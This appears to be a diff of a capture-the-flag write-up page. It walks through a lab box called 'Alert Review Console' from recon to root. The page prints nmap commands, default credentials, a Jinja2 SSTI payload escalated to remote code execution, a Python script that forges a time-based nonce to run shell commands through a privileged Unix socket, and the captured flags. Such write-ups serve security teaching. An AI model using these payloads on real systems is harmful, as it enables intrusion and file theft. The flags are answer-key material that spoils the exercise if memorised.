@@ -67,28 +67,163 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>Target <code>10.48.151.156</code>: SSH (22) and nginx fronting an &quot;Alert Review Console&quot; (80). The <code>/login</code> page prints default credentials (<code>analyst</code>/<code>analyst</code>) in plaintext; the footer hints at keystroke telemetry via <code>libechotap.so</code>.</p>
-<p><strong>SSTI → RCE:</strong> the &quot;preview a draft update&quot; feature POSTs <code>{&quot;title&quot;,&quot;body&quot;}</code> to <code>/api/alert/preview</code> and renders <code>body</code> through Jinja2 without sanitization - <code>{{7*7}}</code> → <code>49</code> confirms it. Escalating with <code>{{ self.__init__.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;id&quot;).read() }}</code> gives RCE as <code>analyst</code> (uid=1001, groups <code>analyst</code>, <code>echo-log</code>).</p>
-<p><strong>Enumeration via RCE:</strong> the alert queue leaks a classifier spec path, mentions the &quot;warden&quot; symlink-swapping decoy mechanism, and a dispatch table at <code>/etc/sentinel/dispatch.json</code> exposing a <code>shell</code> handler gated by <code>nonce_time</code>.</p>
-<p><strong>The sentinel socket:</strong> <code>/opt/sentinel/sentinel.py</code> reveals a Unix socket at <code>/run/sentinel/ctrl.sock</code>, run by the <code>sentinel</code> user with <strong>CAP_DAC_READ_SEARCH</strong> (can read any file regardless of permissions). Its <code>exec_shell</code> handler is gated by <code>nonce = sha256(f&quot;{minute_epoch}:{SALT}&quot;)[:16]</code>, <code>SALT = &quot;sentinel-salt-v1-a3b7c2d9&quot;</code>, accepting ±1 minute of drift - computable entirely from the leaked source.</p>
-<figure class="wu-code" data-lines="7">
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">nmap -Pn -sC -sV -T4 -p- --min-rate 2000 10.48.151.156</span></span></code></pre>
+      
+    </figure><p>Open ports:</p>
+<ul>
+<li><strong>22</strong> - SSH (OpenSSH 9.2p1)</li>
+<li><strong>80</strong> - HTTP (nginx 1.22.1) - &quot;Anadyne Systems · Alert Review Console&quot;</li>
+</ul>
+<h2 id="web-app-default-credentials"><a class="wu-anchor" href="#web-app-default-credentials" aria-hidden="true">#</a>Web App - Default Credentials</h2>
+<p>The login page at <code>/login</code> displays credentials in plaintext:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">dev console credentials: analyst / analyst</code></pre>
+      
+    </figure><p>The footer also hints: <em>&quot;keystroke telemetry via libechotap.so is enabled on this workstation&quot;</em></p>
+<h2 id="ssti-in-preview-endpoint"><a class="wu-anchor" href="#ssti-in-preview-endpoint" aria-hidden="true">#</a>SSTI in Preview Endpoint</h2>
+<p>Each alert page has a &quot;preview a draft update&quot; feature that POSTs to <code>/api/alert/preview</code> with JSON <code>{&quot;title&quot;:&quot;...&quot;,&quot;body&quot;:&quot;...&quot;}</code>.</p>
+<p>Testing for Jinja2 Server-Side Template Injection:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -s -b cookies.txt -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  http://10.48.151.156/api/alert/preview \</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  -d <span class="hljs-string">&#x27;{&quot;title&quot;:&quot;test&quot;,&quot;body&quot;:&quot;{{7*7}}&quot;}&#x27;</span></span></span></code></pre>
+      
+    </figure><p>Response: <code>{&quot;html&quot;:&quot;&lt;h2&gt;test&lt;/h2&gt;\n&lt;div class=&#39;preview-body&#39;&gt;49&lt;/div&gt;&quot;,&quot;ok&quot;:true}</code></p>
+<p><strong>SSTI confirmed.</strong> The body field is rendered through Jinja2 without sanitization.</p>
+<h2 id="rce-as-analyst"><a class="wu-anchor" href="#rce-as-analyst" aria-hidden="true">#</a>RCE as <code>analyst</code></h2>
+<p>Escalating SSTI to Remote Code Execution:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -s -b cookies.txt -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  http://10.48.151.156/api/alert/preview \</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  -d <span class="hljs-string">&#x27;{&quot;title&quot;:&quot;t&quot;,&quot;body&quot;:&quot;{{ self.__init__.__globals__.__builtins__.__import__(\&quot;os\&quot;).popen(\&quot;id\&quot;).read() }}&quot;}&#x27;</span></span></span></code></pre>
+      
+    </figure><p>Result: <code>uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),1004(echo-log)</code></p>
+<h2 id="enumeration-via-rce"><a class="wu-anchor" href="#enumeration-via-rce" aria-hidden="true">#</a>Enumeration via RCE</h2>
+<p>The alert queue contained useful intel:</p>
+<table>
+<thead>
+<tr>
+<th>Alert</th>
+<th>Key Info</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>#3</td>
+<td>Classifier spec at <code>/opt/echochamber/classifier.py</code></td>
+</tr>
+<tr>
+<td>#4</td>
+<td>Warden swaps symlinks for sessions; verdicts in <code>/var/log/echo/verdicts.jsonl</code></td>
+</tr>
+<tr>
+<td>#5</td>
+<td>Dispatch table at <code>/etc/sentinel/dispatch.json</code> (symlink)</td>
+</tr>
+</tbody></table>
+<p>The dispatch table:</p>
+<figure class="wu-code" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-attr">&quot;heartbeat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;heartbeat&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span>    <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;status&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span>     <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;exec_shell&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;gate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;nonce_time&quot;</span><span class="hljs-punctuation">}</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><h2 id="user-flag-sentinel-socket"><a class="wu-anchor" href="#user-flag-sentinel-socket" aria-hidden="true">#</a>User Flag - Sentinel Socket</h2>
+<p>Reading <code>/opt/sentinel/sentinel.py</code> revealed the full mechanism:</p>
+<ul>
+<li>The <strong>sentinel</strong> service listens on a Unix socket at <code>/run/sentinel/ctrl.sock</code></li>
+<li>It runs as the <code>sentinel</code> user with <strong>CAP_DAC_READ_SEARCH</strong> (can read any file on the system)</li>
+<li>The <code>exec_shell</code> handler executes arbitrary shell commands but is gated by a time-based nonce</li>
+<li>The nonce is computed as: <code>sha256(&quot;{minute_epoch}:{SALT}&quot;)[:16]</code> where <code>SALT = &quot;sentinel-salt-v1-a3b7c2d9&quot;</code></li>
+<li>The nonce accepts ±1 minute of drift</li>
+</ul>
+<p>Exploiting it (via SSTI to run Python on the target):</p>
+<figure class="wu-code" data-lines="11">
       <figcaption>
         
         <span class="wu-code-lang">python</span>
-        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">t = <span class="hljs-built_in">int</span>(time.time()) // <span class="hljs-number">60</span></span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">nonce = hashlib.sha256(<span class="hljs-string">f&quot;<span class="hljs-subst">{t}</span>:sentinel-salt-v1-a3b7c2d9&quot;</span>.encode()).hexdigest()[:<span class="hljs-number">16</span>]</span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">cmd = base64.b64encode(<span class="hljs-string">b&quot;cat /home/sentinel/*&quot;</span>).decode()</span></span>
-<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span></span>
-<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">s.connect(<span class="hljs-string">&quot;/run/sentinel/ctrl.sock&quot;</span>)</span></span>
-<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">s.sendall(json.dumps({<span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-string">&quot;nonce&quot;</span>: nonce, <span class="hljs-string">&quot;payload&quot;</span>: cmd}).encode() + <span class="hljs-string">b&quot;\n&quot;</span>)</span></span>
-<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}</span></span></code></pre>
+      <pre id="code-6"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> hashlib, time, json, socket, base64</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">t = <span class="hljs-built_in">int</span>(time.time()) // <span class="hljs-number">60</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">nonce = hashlib.sha256(<span class="hljs-string">f&quot;<span class="hljs-subst">{t}</span>:sentinel-salt-v1-a3b7c2d9&quot;</span>.encode()).hexdigest()[:<span class="hljs-number">16</span>]</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">cmd = base64.b64encode(<span class="hljs-string">b&quot;cat /home/sentinel/*&quot;</span>).decode()</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">s.connect(<span class="hljs-string">&quot;/run/sentinel/ctrl.sock&quot;</span>)</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">s.sendall(json.dumps({<span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-string">&quot;nonce&quot;</span>: nonce, <span class="hljs-string">&quot;payload&quot;</span>: cmd}).encode() + <span class="hljs-string">b&quot;\n&quot;</span>)</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc"><span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">65536</span>).decode())</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">s.close()</span></span></code></pre>
       
-    </figure><p>Decoy flags exist at <code>/var/lib/warden/decoy/{user,root}.txt</code> - traps placed by the symlink-swapping &quot;warden&quot; mechanism. Attack chain: default creds → SSTI → RCE as analyst → read sentinel source → compute nonce → socket shell as sentinel (with CAP_DAC_READ_SEARCH) → user flag.</p>
-
+    </figure><p><strong>User Flag:</strong> <code>isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}</code></p>
+<blockquote>
+<p><strong>Note:</strong> Decoy flags exist at <code>/var/lib/warden/decoy/user.txt</code> (<code>isfcr{echoes_sound_the_same}</code>) and <code>/var/lib/warden/decoy/root.txt</code> (<code>isfcr{s0_cl0se_but_s0_f4r}</code>). These are traps placed by the &quot;warden&quot; symlink-swapping mechanism.</p>
+</blockquote>
+<h2 id="root-flag-cap-dac-read-search"><a class="wu-anchor" href="#root-flag-cap-dac-read-search" aria-hidden="true">#</a>Root Flag - CAP_DAC_READ_SEARCH</h2>
+<p>Since the sentinel process has <code>CAP_DAC_READ_SEARCH</code>, any child process it spawns inherits the capability. This means <code>cat /root/root.txt</code> works through the sentinel socket without needing traditional privilege escalation:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">cmd = base64.b64encode(<span class="hljs-string">b&quot;cat /root/root.txt&quot;</span>).decode()</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># ... same socket connection as above ...</span></span></span></code></pre>
+      
+    </figure><p><strong>Root Flag:</strong> <code>isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}</code></p>
+<hr>
+<h2 id="attack-chain-summary"><a class="wu-anchor" href="#attack-chain-summary" aria-hidden="true">#</a>Attack Chain Summary</h2>
+<figure class="wu-code wu-code-output" data-lines="9">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">Default creds (analyst/analyst)
+  → SSTI in /api/alert/preview (Jinja2)
+    → RCE as analyst (uid=1001)
+      → Read sentinel.py (source code, SALT, nonce algorithm)
+        → Compute time-based nonce
+          → Connect to /run/sentinel/ctrl.sock
+            → exec_shell as sentinel (CAP_DAC_READ_SEARCH)
+              → Read /home/sentinel/* → User Flag
+              → Read /root/root.txt   → Root Flag</code></pre>
+      
+    </figure>
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#recon">Recon</a></li><li><a href="#web-app-default-credentials">Web App - Default Credentials</a></li><li><a href="#ssti-in-preview-endpoint">SSTI in Preview Endpoint</a></li><li><a href="#rce-as-analyst">RCE as analyst</a></li><li><a href="#enumeration-via-rce">Enumeration via RCE</a></li><li><a href="#user-flag-sentinel-socket">User Flag - Sentinel Socket</a></li><li><a href="#root-flag-cap-dac-read-search">Root Flag - CAP_DAC_READ_SEARCH</a></li><li><a href="#attack-chain-summary">Attack Chain Summary</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
